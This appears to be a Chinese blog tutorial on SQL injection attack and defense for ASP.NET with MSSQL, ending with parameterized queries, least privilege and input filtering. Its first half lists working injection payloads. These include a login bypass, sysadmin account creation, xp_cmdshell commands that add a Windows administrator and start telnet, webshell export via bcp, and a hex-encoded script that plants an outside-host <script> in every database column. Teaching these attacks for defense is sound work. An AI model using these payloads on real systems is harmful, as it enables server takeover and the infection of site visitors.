---
layout: post
title:  "SQL注入攻防入门详解"
date:   2016-11-09 15:14:54
categories: sql
tags: sql
author: jiangc
excerpt: 对于sql注入的攻防，我只用过简单拼接字符串的注入及参数化查询，可以说没什么好经验...
---

（对于sql注入的攻防，我只用过简单拼接字符串的注入及参数化查询，可以说没什么好经验，为避免后知后觉的犯下大错，专门查看大量前辈们的心得，这方面的资料颇多，将其精简出自己觉得重要的，就成了该文）

 下面的程序方案是采用 ASP.NET + MSSQL，其他技术在设置上会有少许不同。

    [示例程序下载：SQL注入攻防入门详解_示例](http://files.cnblogs.com/heyuquan/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E9%98%B2%E5%85%A5%E9%97%A8%E8%AF%A6%E8%A7%A3_%E7%A4%BA%E4%BE%8B.rar)

什么是SQL注入（SQL Injection）

所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。在某些表单中，用户输入的内容直接用来构造（或者影响）动态SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击。

尝尝SQL注入

## 1. 一个简单的登录页面

关键代码：（详细见下载的示例代码）

```java
private boolean noProtectLogin(string userName, string password){
    int count = (int)SqlHelper.Instance.ExecuteScalar(string.Format
    ("SELECT COUNT(*) FROM Login WHERE UserName='{0}' AND Password='{1}'", userName, password));
    return count > 0 ? true : false;
}
```

方法中userName和 password 是没有经过任何处理，直接拿前端传入的数据，这样拼接的SQL会存在注入漏洞。（帐户：admin 123456）

1) 输入正常数据，效果如图：

[![image](../../images/2016/201210311922046482.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311921598057.png)

合并的SQL为：
```sql
SELECT COUNT(*) FROM Login WHERE UserName='admin' AND Password='123456'
```

2) 输入注入数据：

如图，即用户名为：用户名：admin’—，密码可随便输入

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922089084.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/20121031192207853.png)

 合并的SQL为：
```sql
 SELECT COUNT(*) FROM Login WHERE UserName='admin'-- Password='123'
```

因为UserName值中输入了“--”注释符，后面语句被省略而登录成功。（常常的手法：前面加上'; ' (分号，用于结束前一条语句)，后边加上'--' (用于注释后边的语句)）

2. 上面是最简单的一种SQL注入，常见的注入语句还有：

1) 猜测数据库名，备份数据库

a) 猜测数据库名： and db_name() >0 或系统表master.dbo.sysdatabases

b) 备份数据库：;backup database 数据库名 to disk = ‘c:\\*.db’;--

或：declare @a sysname;set @a=db_name();backup database @a to disk='你的IP你的共享目录bak.dat' ,name='test';--

2) 猜解字段名称

a) 猜解法：and (select count(字段名) from 表名)>0 若“字段名”存在，则返回正常

b) 读取法：and (select top 1 col\_name(object\_id('表名'),1) from sysobjects)>0 把col\_name(object\_id('表名'),1)中的1依次换成2,3,4,5，6…就可得到所有的字段名称。

3) 遍历系统的目录结构，分析结构并发现WEB虚拟目录（服务器上传木马）

 先创建一个临时表：;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--

a) 利用xp_availablemedia来获得当前所有驱动器,并存入temp表中

;insert temp exec master.dbo.xp_availablemedia;--

b) 利用xp_subdirs获得子目录列表,并存入temp表中

;insert into temp(id) exec master.dbo.xp_subdirs 'c:\\';--

c) 利用xp_dirtree可以获得“所有”子目录的目录树结构,并存入temp表中

;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\\';-- （实验成功）

d) 利用 bcp 命令将表内容导成文件

即插入木马文本，然后导出存为文件。比如导出为asp文件，然后通过浏览器访问该文件并执行恶意脚本。（使用该命令必须启动’ xp_cmdshell’）

Exec master..xp_cmdshell N'BCP "select * from SchoolMarket.dbo.GoodsStoreData;" queryout c:/inetpub/wwwroot/runcommand.asp -w -S"localhost" -U"sa" -P"123"'

(注意：语句中使用的是双引号，另外表名格式为“数据库名.用户名.表名”)

在sql查询器中通过语句：Exec master..xp_cmdshell N'BCP’即可查看BCP相关参数，如图：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201211/201211080214125740.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201211/201211080214126330.png)

4) 查询当前用户的数据库权限

MSSQL中一共存在8种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。

可通过1=(select IS_SRVROLEMEMBER('sysadmin'))得到当前用户是否具有该权限。

5) 设置新的数据库帐户（得到MSSQL管理员账户）

d) 在数据库内添加一个hax用户，默认密码是空

;exec sp_addlogin'hax';--

e) 给hax设置密码 (null是旧密码，password是新密码，user是用户名)

;exec master.dbo.sp_password null,password,username;--

f) 将hax添加到sysadmin组

;exec master.dbo.sp_addsrvrolemember 'hax' ,'sysadmin';--

6) xp_cmdshell MSSQL存储过程（得到 WINDOWS管理员账户 ）

通过(5)获取到sysadmin权限的帐户后，使用查询分析器连接到数据库，可通过xp_cmdshell运行系统命令行（必须是sysadmin权限），即使用 cmd.exe 工具，可以做什么自己多了解下。

下面我们使用xp_cmdshell来创建一个 Windows 用户，并开启远程登录服务：

a) 判断xp_cmdshell扩展存储过程是否存在

SELECT count(*) FROM master.dbo.sysobjects WHERE xtype = 'X' AND name ='xp_cmdshell'

b) 恢复xp_cmdshell扩展存储过程

Exec master.dbo.sp\_addextendedproc 'xp\_cmdshell','e:\\inetput\\web\\xplog70.dll';

开启后使用xp_cmdshell还会报下面错误：

SQL Server 阻止了对组件 'xp_cmdshell' 的过程 'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。

通过执行下面语句进行设置：

\-\- 允许配置高级选项

EXEC sp_configure 'show advanced options', 1

GO

\-\- 重新配置

RECONFIGURE

GO

\-\- 启用xp_cmdshell

EXEC sp\_configure 'xp\_cmdshell', 0

GO

--重新配置

RECONFIGURE

GO

c) 禁用xp_cmdshell扩展存储过程

Exec master.dbo.sp\_dropextendedproc 'xp\_cmdshell';

d) 添加windows用户：

Exec xp_cmdshell 'net user awen /add';

e) 设置好密码：

Exec xp_cmdshell 'net user awen password';

f) 提升到管理员：

Exec xp_cmdshell 'net localgroup administrators awen /add';

g) 开启telnet服务：

Exec xp_cmdshell 'net start tlntsvr'

7) 没有xp_cmdshell扩展程序，也可创建Windows帐户的办法.

(本人windows7系统，测试下面SQL语句木有效果)

declare @shell int ;

execsp_OAcreate 'w script .shell',@shell output ;

execsp_OAmethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c net user awen /add';

execsp_OAmethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c net user awen 123';

execsp_OAmethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c net localgroup administrators awen /add';

在使用的时候会报如下错：

SQL Server 阻止了对组件 'Ole Automation Procedures' 的过程 'sys.sp_OACreate'、'sys.sp_OAMethod' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用 'Ole Automation Procedures'。有关启用 'Ole Automation Procedures' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。

 解决办法：

sp_configure 'show advanced options', 1;

GO

RECONFIGURE;

GO

sp_configure 'Ole Automation Procedures', 1;

GO

RECONFIGURE;

GO

好了，这样别人可以登录你的服务器了，你怎么看？

8) 客户端脚本攻击

攻击1：（正常输入）攻击者通过正常的输入提交方式将恶意脚本提交到数据库中，当其他用户浏览此内容时就会受到恶意脚本的攻击。

措施：转义提交的内容，.NET 中可通过System.Net.WebUtility.HtmlEncode(string) 方法将字符串转换为HTML编码的字符串。

攻击2：（SQL注入）攻击者通过SQL注入方式将恶意脚本提交到数据库中，直接使用SQL语法UPDATE数据库，为了跳过System.Net.WebUtility.HtmlEncode(string) 转义，攻击者会将注入SQL经过“HEX编码”，然后通过exec可以执行“动态”SQL的特性运行脚本”。

参考：

注入：[SQL注入案例曝光，请大家提高警惕](http://www.cnblogs.com/ryu666/archive/2009/07/28/1533248.html)

恢复：[批量清除数据库中被植入的js](http://blog.sina.com.cn/s/blog_5e5d98b50100dlz9.html)

示例代码：（可在示例附带的数据库测试）

a) 向当前数据库的每个表的每个字段插入一段恶意脚本

[?](# "?")
`Declare` `@T` `Varchar``(255),@C` `Varchar``(255)`
`Declare` `Table_Cursor` `Cursor` `For`
`Select` `A.``Name``,B.``Name`
`From` `SysobjectsA,Syscolumns B` `Where` `A.Id=B.Id` `And` `A.Xtype=``'u'` `And` `(B.Xtype=99` `Or` `B.Xtype=35` `Or` `B.Xtype=231` `Or` `B.Xtype=167)`
`Open` `Table_Cursor`
`Fetch` `Next` `From`  `Table_Cursor` `Into` `@T,@C`
`While(@@Fetch_Status=0)`
`Begin`
`Exec``(``'update ['``+@T+``'] Set ['``+@C+``']=Rtrim(Convert(Varchar(8000),['``+@C+``']))+'``'<script src=[http://8f8el3l.cn/0.js></script](http://8f8el3l.cn/0.js></script)>'``''``)`
`Fetch` `Next` `From` `Table_Cursor` `Into` `@T,@C`
`End`
`Close` `Table_Cursor`
`DeallocateTable_Cursor`

b) 更高级的攻击，将上面的注入SQL进行“HEX编码”，从而避免程序的关键字检查、脚本转义等，通过EXEC执行

[?](# "?")

`dEcLaRe` `@s` `vArChAr``(8000)` `sEt` `@s=0x4465636c617265204054205661726368617228323535292c4043205661726368617228323535290d0a4465636c617265205461626c655f437572736f7220437572736f7220466f722053656c65637420412e4e616d652c422e4e616d652046726f6d205379736f626a6563747320412c537973636f6c756d6e73204220576865726520412e49643d422e496420416e6420412e58747970653d27752720416e642028422e58747970653d3939204f7220422e58747970653d3335204f7220422e58747970653d323331204f7220422e58747970653d31363729204f70656e205461626c655f437572736f72204665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c4043205768696c6528404046657463685f5374617475733d302920426567696e20457865632827757064617465205b272b40542b275d20536574205b272b40432b275d3d527472696d28436f6e7665727428566172636861722838303030292c5b272b40432b275d29292b27273c736372697074207372633d687474703a2f2f386638656c336c2e636e2f302e6a733e3c2f7363726970743e272727294665746368204e6578742046726f6d20205461626c655f437572736f7220496e746f2040542c404320456e6420436c6f7365205461626c655f437572736f72204465616c6c6f63617465205461626c655f437572736f72;`
`eXeC``(@s);``--`

c) 批次删除数据库被注入的脚本

[?](# "?")2

`declare` `@delStrnvarchar(500)`

`set` `@delStr=``'<script src=[http://8f8el3l.cn/0.js></script](http://8f8el3l.cn/0.js></script)>'` `--要被替换掉字符`

`setnocount` `on`

`declare` `@tableNamenvarchar(100),@columnNamenvarchar(100),@tbIDint,@iRowint,@iResultint`

`declare` `@sqlnvarchar(500)`

`set` `@iResult=0`

`declare` `cur` `cursor` `for`

`selectname,id` `from` `sysobjects` `where` `xtype=``'U'`

`open` `cur`

`fetch` `next` `from` `cur` `into` `@tableName,@tbID`

`while @@fetch_status=0`

`begin`

`declare` `cur1` `cursor` `for`

`--xtype in (231,167,239,175) 为char,varchar,nchar,nvarchar类型`

`select` `name` `from` `syscolumns` `where` `xtype` `in` `(231,167,239,175)` `and` `id=@tbID`

`open` `cur1`

`fetch` `next` `from` `cur1` `into` `@columnName`

`while @@fetch_status=0`

`begin`

`set` `@sql=``'update ['` `+ @tableName +` `'] set ['``+ @columnName +``']= replace(['``+@columnName+``'],'``''``+@delStr+``''``','``''``') where ['``+@columnName+``'] like '``'%'``+@delStr+``'%'``''`    

`execsp_executesql @sql`

`set` `@iRow=@@rowcount`

`set` `@iResult=@iResult+@iRow`

`if @iRow>0`

`begin`

`print` `'表：'``+@tableName+``',列:'``+@columnName+``'被更新'``+``convert``(``varchar``(10),@iRow)+``'条记录;'`

`end`

`fetch` `next` `from` `cur1` `into` `@columnName`

`end`

`close` `cur1`

`deallocate` `cur1`

`fetch` `next` `from` `cur` `into` `@tableName,@tbID`

`end`

`print` `'数据库共有'``+``convert``(``varchar``(10),@iResult)+``'条记录被更新!!!'`

`close` `cur`

`deallocate` `cur`

`setnocount` `off`

d) 我如何得到“HEX编码”？

开始不知道HEX是什么东西，后面查了是“十六进制”，网上已经给出两种转换方式：（注意转换的时候不要加入十六进制的标示符 ’0x’ ）

Ø [在线转换 （TRANSLATOR, BINARY），进入……](http://home.paulschou.net/tools/xlate/)

Ø [C#版的转换，进入……](http://hi.baidu.com/bopdawpdarbenxq/item/4be36d83d7937356e63d19c5)

9) 对于敏感词过滤不到位的检查，我们可以结合函数构造SQL注入

比如过滤了update，却没有过滤declare、exec等关键词，我们可以使用reverse来将倒序的sql进行注入：

[?](# "?")

`declare` `@A` `varchar``(200);``set` `@A=reverse(``''``'58803303431'``'=emanresu erehw '``'9d4d9c1ac9814f08'``'=drowssaP tes xxx tadpu'``);`

## 防止SQL注入

## 1. 数据库权限控制，只给访问数据库的web应用功能所需的最低权限帐户。

如MSSQL中一共存在8种权限：sysadmin, dbcreator, diskadmin, processadmin, serveradmin, setupadmin, securityadmin, bulkadmin。

##2. 自定义错误信息，首先我们要屏蔽服务器的详细错误信息传到客户端。

在 ASP.NET 中，可通过web.config配置文件的<customErrors>节点设置：

[?](# "?")


`<``customErrors` `defaultRedirect="url" mode="On|Off|RemoteOnly">`

`<``error.` `. ./>`

`</``customErrors``>`

[更详细，请进入……](http://msdn.microsoft.com/zh-cn/library/h0hfz6fc(v=vs.80).aspx)

mode：指定是启用或禁用自定义错误，还是仅向远程客户端显示自定义错误。

On

指定启用自定义错误。如果未指定defaultRedirect，用户将看到一般性错误。

Off

指定禁用自定义错误。这允许显示标准的详细错误。

RemoteOnly

指定仅向远程客户端显示自定义错误并且向本地主机显示 ASP.NET 错误。这是默认值。

看下效果图：

设置为<customErrors mode="On">一般性错误：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922155916.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922122276.png)

设置为<customErrors mode="Off">：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922238089.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922188617.png)

## 3. 把危险的和不必要的存储过程删除

xp_：扩展存储过程的前缀，SQL注入攻击得手之后，攻击者往往会通过执行xp_cmdshell之类的扩展存储过程，获取系统信息，甚至控制、破坏系统。

xp_cmdshell

能执行dos命令，通过语句sp_dropextendedproc删除，

不过依然可以通过sp_addextendedproc来恢复，因此最好删除或改名xplog70.dll（sql server 2000、windows7）

xpsql70.dll(sqlserer 7.0)

xp_fileexist

用来确定一个文件是否存在

xp_getfiledetails

可以获得文件详细资料

xp_dirtree

可以展开你需要了解的目录，获得所有目录深度

Xp_getnetname

可以获得服务器名称

Xp_regaddmultistring

Xp_regdeletekey

Xp_regdeletevalue

Xp_regenumvalues

Xp_regread

Xp_regremovemultistring

Xp_regwrite

可以访问注册表的存储过程

Sp_OACreate

Sp_OADestroy

Sp_OAGetErrorInfo

Sp_OAGetProperty

Sp_OAMethod

Sp_OASetProperty

Sp_OAStop

如果你不需要请丢弃OLE自动存储过程

4. 非参数化SQL与参数化SQL

1) 非参数化（动态拼接SQL）

a) 检查客户端脚本：若使用.net，直接用System.Net.WebUtility.HtmlEncode(string)将输入值中包含的[《HTML特殊转义字符》](http://www.cnblogs.com/rpoplar/archive/2012/08/03/2621409.html)转换掉。

b) 类型检查：对接收数据有明确要求的，在方法内进行类型验证。如数值型用int.TryParse()，日期型用DateTime.TryParse() ，只能用英文或数字等。

c) 长度验证：要进行必要的注入，其语句也是有长度的。所以如果你原本只允许输入10字符，那么严格控制10个字符长度，一些注入语句就没办法进行。

d) 使用枚举：如果只有有限的几个值，就用枚举。

e) 关键字过滤：这个门槛比较高，因为各个数据库存在关键字，内置函数的差异，所以对编写此函数的功底要求较高。如公司或个人有积累一个比较好的通用过滤函数还请留言分享下，学习学习，谢谢！

这边提供一个关键字过滤参考方案(MSSQL)：

[?](# "?")

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

`public` `static` `bool` `ValiParms(``string` `parms)`

`{`

`if` `(parms ==` `null``)`

`{`

`return` `false``;`

`}`

`Regex regex =` `new` `Regex(``"sp_"``, RegexOptions.IgnoreCase);`

`Regex regex2 =` `new` `Regex(``"'"``, RegexOptions.IgnoreCase);`

`Regex regex3 =` `new` `Regex(``"create "``, RegexOptions.IgnoreCase);`

`Regex regex4 =` `new` `Regex(``"drop "``, RegexOptions.IgnoreCase);  `

`Regex regex5 =` `new` `Regex(``"\""``, RegexOptions.IgnoreCase);`

`Regex regex6 =` `new` `Regex(``"exec "``, RegexOptions.IgnoreCase);`

`Regex regex7 =` `new` `Regex(``"xp_"``, RegexOptions.IgnoreCase);`

`Regex regex8 =` `new` `Regex(``"insert "``, RegexOptions.IgnoreCase);`

`Regex regex9 =` `new` `Regex(``"delete "``, RegexOptions.IgnoreCase);`

`Regex regex10 =` `new` `Regex(``"select "``, RegexOptions.IgnoreCase);`

`Regex regex11 =` `new` `Regex(``"update "``, RegexOptions.IgnoreCase);`

`return` `(regex.IsMatch(parms) || (regex2.IsMatch(parms) || (regex3.IsMatch(parms) || (regex4.IsMatch(parms) || (regex5.IsMatch(parms) || (regex6.IsMatch(parms) || (regex7.IsMatch(parms) || (regex8.IsMatch(parms) || (regex9.IsMatch(parms) || (regex10.IsMatch(parms) || (regex11.IsMatch(parms))))))))))));`

`}`

优点：写法相对简单，网络传输量相对参数化拼接SQL小

缺点：

a) 对于关键字过滤，常常“顾此失彼”，如漏掉关键字，系统函数，对于HEX编码的SQL语句没办法识别等等，并且需要针对各个数据库封装函数。

b) 无法满足需求：用户本来就想发表包含这些过滤字符的数据。

c) 执行拼接的SQL浪费大量缓存空间来存储只用一次的查询计划。服务器的物理内存有限，SQLServer的缓存空间也有限。有限的空间应该被充分利用。

2) 参数化查询（Parameterized Query）

a) 检查客户端脚本，类型检查，长度验证，使用枚举，明确的关键字过滤这些操作也是需要的。他们能尽早检查出数据的有效性。

b) 参数化查询原理：在使用参数化查询的情况下，数据库服务器不会将参数的内容视为SQL指令的一部份来处理，而是在数据库完成 SQL 指令的编译后，才套用参数运行，因此就算参数中含有具有损的指令，也不会被数据库所运行。

c) 所以在实际开发中，入口处的安全检查是必要的，参数化查询应作为最后一道安全防线。

优点：

Ø 防止SQL注入(使单引号、分号、注释符、xp_扩展函数、拼接SQL语句、EXEC、SELECT、UPDATE、DELETE等SQL指令无效化)

Ø 参数化查询能强制执行类型和长度检查。

Ø 在MSSQL中生成并重用查询计划，从而提高查询效率（执行一条SQL语句，其生成查询计划将消耗大于50%的时间）

缺点：

Ø 不是所有数据库都支持参数化查询。目前Access、SQL Server、MySQL、SQLite、Oracle等常用数据库支持参数化查询。

疑问：参数化如何“批量更新”数据库。

a) 通过在参数名上增加一个计数来区分开多个参数化语句拼接中的同名参数。

EG：

[?](# "?")

1

2

3

4

5

6

7

8

9

`StringBuilder sqlBuilder=``new` `StringBuilder(512);`

`Int count=0;`

`For(循环)`

`{`

`sqlBuilder.AppendFormat(“UPDATE login SET password=@password{0} WHERE username=@userName{0}”,count.ToString());`

`SqlParameter para=``new` `SqlParamter(){ParameterName=@password+count.ToString()}`

`……`

`Count++;`

`}`

b) 通过MSSQL 2008的新特性：表值参数，将C#中的整个表当参数传递给存储过程，由SQL做逻辑处理。注意C#中参数设置parameter.SqlDbType = System.Data.SqlDbType.Structured;  [详细请查看……](http://www.codeproject.com/Articles/39161/C-and-Table-Value-Parameters)

疑虑：有部份的开发人员可能会认为使用参数化查询，会让程序更不好维护，或者在实现部份功能上会非常不便，然而，使用参数化查询造成的额外开发成本，通常都远低于因为SQL注入攻击漏洞被发现而遭受攻击，所造成的重大损失。

另外：想验证重用查询计划的同学，可以使用下面两段辅助语法

[?](# "?")

1

2

3

4

5

6

7

8

9

`--清空缓存的查询计划`

`DBCC FREEPROCCACHE`

`GO`

`--查询缓存的查询计划`

`SELECT` `stats.execution_count` `AS` `cnt, p.size_in_bytes` `AS` `[``size``], [sql].[text]` `AS` `[plan_text] `

`FROM` `sys.dm_exec_cached_plans p`

`OUTER` `APPLY sys.dm_exec_sql_text (p.plan_handle) sql`

`JOIN` `sys.dm_exec_query_stats stats` `ON` `stats.plan_handle = p.plan_handle`

`GO`

3) 参数化查询示例

效果如图：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922275184.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922251795.png)

参数化关键代码：

[?](# "?")

1

2

3

4

5

6

7

8

9

10

11

`Private` `bool` `ProtectLogin(``string` `userName,` `string` `password)`

`{`

`SqlParameter[] parameters =` `new` `SqlParameter[]`

`{`

`new` `SqlParameter{ParameterName=``"@UserName"``,SqlDbType=SqlDbType.NVarChar,Size=10,Value=userName},`

`new` `SqlParameter{ParameterName=``"@Password"``,SqlDbType=SqlDbType.VarChar,Size=20,Value=password}`

`};`

`int` `count = (``int``)SqlHelper.Instance.ExecuteScalar`

`(``"SELECT COUNT(*) FROM Login WHERE UserName=@UserName AND Password=@password"``, parameters);`

`return` `count > 0 ?` `true` `:` `false``;`

`}`

5. 存储过程

存储过程（Stored Procedure）是在大型数据库系统中，一组为了完成特定功能的SQL 语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给出参数（如果该存储过程带有参数）来执行它。

优点：

a) 安全性高，防止SQL注入并且可设定只有某些用户才能使用指定存储过程。

b) 在创建时进行预编译，后续的调用不需再重新编译。

c) 可以降低网络的通信量。存储过程方案中用传递存储过程名来代替SQL语句。

缺点：

a) 非应用程序内联代码，调式麻烦。

b) 修改麻烦，因为要不断的切换开发工具。（不过也有好的一面，一些易变动的规则做到存储过程中，如变动就不需要重新编译应用程序）

c) 如果在一个程序系统中大量的使用存储过程，到程序交付使用的时候随着用户需求的增加会导致数据结构的变化，接着就是系统的相关问题了，最后如果用户想维护该系统可以说是很难很难（eg：没有VS的查询功能）。

演示请下载示例程序，关键代码为：

[?](# "?")

1

2

`cmd.CommandText = procName;` `// 传递存储过程名`

`cmd.CommandType = CommandType.StoredProcedure;` `// 标识解析为存储过程`

如果在存储过程中SQL语法很复杂需要根据逻辑进行拼接，这时是否还具有放注入的功能？

答：MSSQL中可以通过 EXEC 和sp_executesql动态执行拼接的sql语句，但sp_executesql支持替换 Transact-SQL 字符串中指定的任何参数值， EXECUTE 语句不支持。所以只有使用sp_executesql方式才能启到参数化防止SQL注入。

关键代码：（详细见示例）

a) sp_executesql

[?](# "?")

1

2

3

4

5

6

7

8

9

10

11

`CREATE` `PROCEDURE` `PROC_Login_executesql(`

`@userNamenvarchar(10),`

`@``password` `nvarchar(10),`

`@``count` `int` `OUTPUT`

`)`

`AS`

`BEGIN`

`DECLARE` `@s nvarchar(1000);`

`set` `@s=N``'SELECT @count=COUNT(*) FROM Login WHERE UserName=@userName AND Password=@password'``;`

`EXEC` `sp_executesql @s,N``'@userName nvarchar(10),@password nvarchar(10),@count int output'``,@userName=@userName,@``password``=@``password``,@``count``=@``count` `output`

`END`

b) EXECUTE（注意sql中拼接字符，对于字符参数需要额外包一层单引号，需要输入两个单引号来标识sql中的一个单引号）

[?](# "?")

1

2

3

4

5

6

7

8

9

10

`CREATE` `PROCEDURE` `PROC_Login_EXEC(`

`@userNamenvarchar(10),`

`@``password` `varchar``(20)`

`)`

`AS`

`BEGIN`

`DECLARE` `@s nvarchar(1000);`

`set` `@s=``'SELECT @count=COUNT(*) FROM Login WHERE UserName='``''``+``CAST``(@userName` `AS` `NVARCHAR(10))+``''``' AND Password='``''``+``CAST``(@``password` `AS` `VARCHAR``(20))+``''``''``;`

`EXEC``(``'DECLARE @count int;'` `+@s+``'select @count'``);`

`END`

 注入截图如下：

      [![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922302346.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922292478.png)

6. 专业的SQL注入工具及防毒软件

情景1

A：“丫的，又中毒了……”

B：“我看看，你这不是裸机在跑吗？”

电脑上至少也要装一款杀毒软件或木马扫描软件，这样可以避免一些常见的侵入。比如开篇提到的SQL创建windows帐户，就会立马报出警报。

 情景2

 A：“终于把网站做好了，太完美了，已经检查过没有漏洞了！”

 A：“网站怎么被黑了，怎么入侵的？？？”

 公司或个人有财力的话还是有必要购买一款专业SQL注入工具来验证下自己的网站，这些工具毕竟是专业的安全人员研发，在安全领域都有自己的独到之处。SQL注入工具介绍：[10个SQL注入工具](http://blog.jobbole.com/17763/)

7. 额外小知识：LIKE中的通配符

尽管这个不属于SQL注入，但是其被恶意使用的方式是和SQL注入类似的。

参考：[SQL中通配符的使用](http://losegoat.blog.163.com/blog/static/1822557200852111915785/)

%

包含零个或多个字符的任意字符串。

_

任何单个字符。

\[\]

指定范围（例如 \[a-f\]）或集合（例如 \[abcdef\]）内的任何单个字符。

\[^\]

不在指定范围（例如 \[^a - f\]）或集合（例如 \[^abcdef\]）内的任何单个字符。

 在模糊查询LIKE中，对于输入数据中的通配符必须转义，否则会造成客户想查询包含这些特殊字符的数据时，这些特殊字符却被解析为通配符。不与 LIKE 一同使用的通配符将解释为常量而非模式。

**注意使用通配符的索引性能问题：**

a) like的第一个字符是'%'或'_'时，为未知字符不会使用索引, sql会遍历全表。

b) 若通配符放在已知字符后面，会使用索引。

网上有这样的说法，不过我在MSSQL中使用 ctrl+L 执行语法查看索引使用情况却都没有使用索引，可能在别的数据库中会使用到索引吧……

截图如下：

[![image](https://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922338669.png "image")](http://images.cnblogs.com/cnblogs_com/heyuquan/201210/201210311922313294.png)

 有两种将通配符转义为普通字符的方法：

1) 使用ESCAPE关键字定义转义符（通用）

在模式中，当转义符置于通配符之前时，该通配符就解释为普通字符。例如，要搜索在任意位置包含字符串 5% 的字符串，请使用：

 WHERE ColumnA LIKE '%5/%%' ESCAPE '/'

2) 在方括号 (\[ \]) 中只包含通配符本身，或要搜索破折号 (-) 而不是用它指定搜索范围，请将破折号指定为方括号内的第一个字符。EG：

符号

含义

LIKE '5\[%\]'

5%

LIKE '5%'

5 后跟 0 个或多个字符的字符串

LIKE '\[_\]n'

_n

LIKE '_n'

an, in, on (and so on)

LIKE '\[a-cdf\]'

a、b、c、d 或 f

LIKE '\[-acdf\]'

-、a、c、d 或 f

LIKE '\[ \[ \]'

\[

LIKE '\]'

\] （右括号不需要转义）

 所以，进行过输入参数的关键字过滤后，还需要做下面转换确保LIKE的正确执行

[?](# "?")

1

2

3

4

5

6

7

`private` `static` `string` `ConvertSqlForLike(``string` `sql)`

`{`

`sql = sql.Replace(``"["``,` `"[[]"``);` `// 这句话一定要在下面两个语句之前，否则作为转义符的方括号会被当作数据被再次处理`

`sql = sql.Replace(``"_"``,` `"[_]"``);`

`sql = sql.Replace(``"%"``,` `"[%]"``);`

`return` `sql;`

`}`

结束语：感谢你耐心的观看。恭喜你， SQL安全攻防你已经入门了……

参考文献：

 [SQL注入天书](http://wenku.baidu.com/view/dc6b95660b1c59eef8c7b449.html)

 [(百度百科)SQL注入](http://baike.baidu.com/view/3896.htm)

扩展资料：

        [Sql Server 编译、重编译与执行计划重用原理](http://blog.csdn.net/babauyang/article/details/7714211)  

 [浅析Sql Server参数化查询](http://www.cnblogs.com/lzrabbit/archive/2012/04/21/2460978.html)\-\-\-\-\-验证了参数的类型和长度对参数化查询影响

 [Sql Server参数化查询之**where in**和like实现详解](http://wenku.baidu.com/view/9f19df7701f69e3143329421.html)  

 \-\-\-\-\-讲述6种参数化实现方案

 [webshell](http://baike.baidu.com/view/53110.htm)  \-\-\-\-\-不当小白，你必须认识的专业术语。一个用于站长管理，入侵者入侵的好工具

 [SQL注入技术和跨站脚本攻击的检测](http://www.searchsecurity.com.cn/showcontent_2544.htm) \-\-\-\-\-讲解使用正则表达式检测注入

            [XSS(百度百科)](http://baike.baidu.com/view/50325.htm)              -------恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。

            [XSS攻击实例](http://news.cnblogs.com/n/106793/)                -------基本思路：我们都知道网上很多网站都可以“记住你的用户名和密码”或是“自动登录”，其实是在你的本地设置了一个cookie，这种方式可以让你免去每次都输入用户名和口令的痛苦，但是也带来很大的问题。试想，如果某用户在“自动登录”的状态下，如果你运行了一个程序，这个程序访问“自动登录”这个网站上一些链接、提交一些表单，那么，也就意味着这些程序不需要输入用户名和口令的手动交互就可以和服务器上的程序通话。

         [Web安全测试之XSS](http://www.cnblogs.com/TankXiao/archive/2012/03/21/2337194.html)

            [Web API 入门指南 - 闲话安全 ](http://www.cnblogs.com/developersupport/p/WebAPI-Security.html)

            [中间人攻击(MITM)姿势总结](http://www.cnblogs.com/LittleHann/p/3735602.html)

            [浅谈WEB安全性（前端向）](http://www.cnblogs.com/vajoy/p/4176908.html)

  

  
作者：[滴答的雨](http://www.cnblogs.com/heyuquan/)  
出处：[http://www.cnblogs.com/heyuquan/](http://www.cnblogs.com/heyuquan/)  
本文版权归作者和博客园共有，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接，否则保留追究法律责任的权利。  
  
欢迎园友讨论下自己的见解，及向我推荐更好的资料。  
本文如对您有帮助，还请多帮 **【推荐】** 下此文。  
谢谢！！！  (*^_^*)  
技术群：185718116（广深莞·NET技术），欢迎你的加入  
技术群：[![广西IT技术交流](http://pub.idqqimg.com/wpa/images/group.png "广西IT技术交流")](http://shang.qq.com/wpa/qunwpa?idkey=bedc1077396d17ebbb84f29e7704a63fb3da35c3b6902e537e6cf2283ccbb6d3)（广西IT技术交流），欢迎你的加入

